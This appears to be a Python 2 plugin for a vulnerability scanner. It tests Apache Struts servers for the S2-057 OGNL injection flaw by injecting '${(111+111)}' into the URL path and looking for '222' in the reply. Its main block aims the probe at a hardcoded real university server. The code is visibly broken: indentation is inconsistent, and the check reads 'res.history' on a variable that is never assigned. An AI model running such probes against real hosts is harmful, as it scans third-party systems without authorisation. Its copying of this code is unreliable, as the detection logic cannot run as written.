#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from ..t  import T
import requests
from termcolor import cprint

class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']

    def check_vul(self, full_target_url):
		# http://gimssom.bnuz.edu.cn:8089/login.action/
		url_piece = full_target_url.split('/')
		#because url is composed by xxx://两个/,所以拆分的时候用倒数第二个
		hack_script = '${(111+111)}'
		check_url = ''
		for i in url_piece:
			if i == url_piece[-1]:
				check_url += hack_script + '/' + i
			else:
				check_url += i + '/'
		# print "convert[%s] to [%s]"%(full_target_url, check_url)
		return check_url

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'
	    timeout=3
	    res=None
	    res_html=None
	    check_url = self.check_vul(target_url)

	    result = {}
	    result['result']=False

	    try:
		headers = {"Content-Type":"application/x-www-form-urlencoded"}
		r = requests.get(check_url,headers=headers,timeout=5)
	        res_html = r.text
	    except Exception,e:
		print e
		return result
	    finally:
	    	if res is not None:
		    res.close()
                    del res
		if '302' in str(res.history) and res_html.find('222') <> -1:
		    cprint(target_url + '存在structs057漏洞', 'red')
		    info = target_url + "struts057  Vul"
		    result['result'] = True
		    result['VerifyInfo'] = {}
		    result['VerifyInfo']['type'] = 'struts057 Vul'
		    result['VerifyInfo']['URL'] = target_url
		    result['VerifyInfo']['payload'] = 'structs hole detect.'
		    result['VerifyInfo']['result'] = info
		    result['VerifyInfo']['level'] = '高危(HOLE)'
		    return result
        return result
		

if __name__ == '__main__':
    print P().verify(ip='gimssom.bnuz.edu.cn',port='8089')                
